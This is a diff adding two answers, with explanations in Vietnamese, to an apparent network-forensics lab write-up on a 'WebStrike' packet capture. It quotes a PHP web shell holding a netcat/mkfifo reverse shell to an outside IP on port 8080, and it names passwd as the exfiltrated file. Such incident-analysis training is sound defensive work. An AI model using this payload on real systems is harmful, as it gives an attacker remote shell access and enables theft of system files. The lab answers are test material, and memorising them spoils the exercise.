@@ -48,3 +48,16 @@ file: [LabFile](LabFiles/c116-WebStrike.pcap)
 
 ![image](Image/Q4.png)
 `Answer: /reviews/uploads/`
+## Q5: Identifying the port utilized by the web shell helps improve firewall configurations for blocking unauthorized outbound traffic. What port was used by the malicious web shell?
+### Solution
+* Yêu cầu là cổng nào được sử dụng để chứa mã độc thì mình đã research ra được cổng 8080 thường được dựng lên để gửi mã độc
+* Đoạn mã độc được tìm thấy:
+`<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>`
+`Answer: 8080`
+## Q6: Understanding the value of compromised data assists in prioritizing incident response actions. What file was the attacker trying to exfiltrate?
+### Solution
+* Sau khi mình đọc đoạn mã độc thì có thể hiểu là máy tấn công sẽ thực hiện được các câu lệnh và khiến bên bị tấn công gửi file về địa chỉ ip tại cổng 8080
+* Nên mình đã dùng filter source ip: 24.49.63.79 và tìm thấy file bị gửi đi
+
+![image](Image/Q6.png)
+`Answer: passwd`
